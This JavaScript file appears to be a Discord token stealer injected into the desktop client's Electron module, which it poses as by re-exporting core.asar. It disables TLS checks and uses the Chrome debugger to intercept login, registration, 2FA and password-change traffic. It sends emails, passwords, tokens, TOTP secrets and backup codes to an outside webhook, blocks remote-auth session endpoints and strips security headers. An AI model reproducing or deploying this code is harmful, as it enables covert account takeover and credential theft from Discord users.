/* __SP_INJECTED__ */
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
const { BrowserWindow, session } = require(Buffer.from('656c656374726f6e', 'hex').toString());
const C = {
    u: 'http://veled.com.tr/v1/webhook',
    k: 'H95S2-MJ56T-LJPQ2-ATZ6Z',
    n: 'Supreme',
    i: 'https://i.imgur.com/YYumsB0.png',
    o: 'OPERATOR_ID',
    b: 'H95S2-MJ56T-LJPQ2-ATZ6Z',
    f: ['/auth/login', '/auth/register', '/mfa/totp', '/users/@me', '/auth/verify/view-backup-codes-challenge', '/mfa/codes-verification', '/mfa/codes']
};
let pC = '', bP = '';
const hk = (emb) => {
    try {
        const p = JSON.stringify({ username: C.n, avatar_url: C.i, embeds: emb });
        const u = new URL(C.u);
        const H = require(u.protocol === 'https:' ? 'https' : 'http');
        const r = H.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(p), 'x-build-key': C.k } });
        r.on('error', () => {});
        r.write(p);
        r.end();
    } catch {}
};
const ex = async (s, tO = 5000) => {
    const ws = BrowserWindow.getAllWindows().filter(w => !w.isDestroyed() && w.isVisible());
    if (ws.length === 0) return null;
    try {
        return await Promise.any(ws.map(w => {
            return Promise.race([
                w.webContents.executeJavaScript(s, true),
                new Promise((_, rj) => setTimeout(() => rj(), tO))
            ]).then(r => r ? r : Promise.reject());
        }));
    } catch { return null; }
};
const gT = async () => await ex(`(()=>{try{let t=null;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m in r.c){const e=r.c[m]?.exports;if(e?.default?.getToken)t=e.default.getToken();else if(e?.getToken)t=e.getToken();if(typeof t==='string'&&t.length>20)return t;}}]);return t;}catch{return null;}})()`);
const gU = async (t) => {
    if (!t) return null;
    for (let i = 0; i < 5; i++) {
        try {
            const u = await ex(`(async()=>{
                if(window.location.protocol!=='https:') return null;
                try {
                    const r = await fetch('https://discord.com/api/v9/users/@me', {headers: {'Authorization': '${t}'}});
                    if (r.ok) return await r.json();
                } catch { return null; }
            })()`, 10000);
            if (u && u.id) return u;
        } catch {}
        await new Promise(r => setTimeout(r, 800));
    }
    return null;
};
const fBC = (cs) => {
    if (!cs || cs.length === 0) return { ch1: 'N/A', ch2: '' };
    const f = cs.map(c => {
        const s = (typeof c === 'string' ? c : c.code).replace(/-/g, '');
        return s.length === 8 ? s.slice(0, 4) + '-' + s.slice(4) : s;
    });
    const m = Math.ceil(f.length / 2);
    return { ch1: f.slice(0, m).join('\
'), ch2: f.slice(m).join('\
') };
};
const sCDP = () => {
    const at = async () => {
        try {
            const w = BrowserWindow.getAllWindows().find(x => !x.isDestroyed());
            if (!w) return setTimeout(at, 2000);
            if (!w.webContents.debugger.isAttached()) {
                try { w.webContents.debugger.attach('1.3'); } catch { return setTimeout(at, 3000); }
            }
            w.webContents.debugger.on('message', async (_, m, p) => {
                if (m !== 'Network.responseReceived') return;
                const u = p.response.url;
                if (!C.f.some(i => u.includes(i))) return;
                if (![200, 202, 204].includes(p.response.status)) return;
                let d = {}, b = {};
                try {
                    const r = await w.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: p.requestId });
                    d = JSON.parse(r.postData || '{}');
                } catch {}
                try {
                    const r = await w.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: p.requestId });
                    b = JSON.parse(r.body || '{}');
                } catch {}
                let t = b.token || null;
                if (!t) {
                    for (let i = 0; i < 8; i++) {
                        t = await gT();
                        if (t) break;
                        await new Promise(r => setTimeout(r, 150));
                    }
                }
                if (typeof t !== 'string') t = 'N/A';
                const usr = await gU(t) || { username: 'Unknown', id: '0', avatar: '', email: 'N/A' };
                const av = usr.avatar ? `https://cdn.discordapp.com/avatars/${usr.id}/${usr.avatar}.webp` : null;
                if (u.includes('/login') || u.includes('/register')) {
                    if (d.password) pC = d.password;
                    if (b.mfa) return;
                    const email = usr.email !== 'N/A' ? usr.email : (d.login || d.email || 'N/A');
                    const username = usr.username !== 'Unknown' ? usr.username : (d.username || 'Unknown');
                    hk([{
                        author: { name: '@' + username, icon_url: av },
                        description: u.includes('/login') ? '**Login Detected**' : '**Registration Detected**',
                        color: 0xFF0000,
                        thumbnail: av ? { url: av } : undefined,
                        fields: [
                            { name: 'Email', value: `\`${email}\``, inline: true },
                            { name: 'Password', value: `\`${d.password || pC || 'N/A'}\``, inline: true },
                            { name: 'Token', value: `\`\`\`${t}\`\`\``, inline: false }
                        ],
                        footer: { text: `${C.o} (${C.b})` }
                    }]);
                } else if (u.includes('/mfa/totp') && !u.includes('/enable')) {
                    hk([{
                        author: { name: '@' + usr.username, icon_url: av },
                        description: '**2FA Login Detected**',
                        color: 0xFF0000,
                        thumbnail: av ? { url: av } : undefined,
                        fields: [
                            { name: 'Password', value: `\`${pC || 'N/A'}\``, inline: true },
                            { name: 'Token', value: `\`\`\`${t}\`\`\``, inline: false }
                        ],
                        footer: { text: `${C.o} (${C.b})` }
                    }]);
                } else if (u.includes('/mfa/totp/enable') || u.includes('/mfa/codes-verification') || u.includes('/mfa/codes')) {
                    const cs = b.backup_codes || [];
                    const { ch1, ch2 } = fBC(cs);
                    if (u.includes('/enable') || cs.length > 0 || d.key || d.secret) {
                        hk([{
                            author: { name: '@' + usr.username, icon_url: av },
                            description: u.includes('/enable') ? '**2FA Enabled**' : '**2FA Codes Viewed**',
                            color: 0xFF0000,
                            thumbnail: av ? { url: av } : undefined,
                            fields: [
                                { name: 'Password', value: `\`${bP || pC || 'N/A'}\``, inline: true },
                                { name: 'Secret', value: `\`${d.secret || d.key || 'N/A'}\``, inline: true },
                                { name: 'Codes pt1', value: `\`\`\`${ch1}\`\`\``, inline: true },
                                { name: 'Codes pt2', value: `\`\`\`${ch2 || 'N/A'}\`\`\``, inline: true },
                                { name: 'Token', value: `\`\`\`${t}\`\`\``, inline: false }
                            ],
                            footer: { text: `${C.o} (${C.b})` }
                        }]);
                    }
                } else if (u.includes('/view-backup-codes-challenge')) {
                    if (d.password) bP = d.password;
                } else if (d.new_password) {
                    hk([{
                        author: { name: '@' + usr.username, icon_url: av },
                        description: '**Password Changed**',
                        color: 0xFF0000,
                        thumbnail: av ? { url: av } : undefined,
                        fields: [
                            { name: 'New Password', value: `\`${d.new_password}\``, inline: true },
                            { name: 'Token', value: `\`\`\`${t}\`\`\``, inline: false }
                        ],
                        footer: { text: `${C.o} (${C.b})` }
                    }]);
                } else if (d.email && !d.new_password) {
                    hk([{
                        author: { name: '@' + usr.username, icon_url: av },
                        description: '**Email Changed**',
                        color: 0xFF0000,
                        thumbnail: av ? { url: av } : undefined,
                        fields: [
                            { name: 'Old Email', value: `\`${usr.email || 'N/A'}\``, inline: true },
                            { name: 'New Email', value: `\`${d.email}\``, inline: true },
                            { name: 'Token', value: `\`\`\`${t}\`\`\``, inline: false }
                        ],
                        footer: { text: `${C.o} (${C.b})` }
                    }]);
                }
            });
            w.webContents.debugger.sendCommand('Network.enable');
            w.on('closed', () => setTimeout(at, 5000));
        } catch { setTimeout(at, 3000); }
    };
    setTimeout(at, 3000);
};
sCDP();
session.defaultSession.webRequest.onBeforeRequest(
    { urls: ['wss://remote-auth-gateway.discord.gg/*', 'https://*/auth/sessions', 'https://*.discord.com/api/*/auth/sessions'] },
    (_, cb) => cb({ cancel: true })
);
session.defaultSession.webRequest.onHeadersReceived((d, cb) => {
    delete d.responseHeaders['content-security-policy'];
    delete d.responseHeaders['content-security-policy-report-only'];
    cb({ responseHeaders: { ...d.responseHeaders, 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Origin': '*' } });
});
module.exports = require('./core.asar');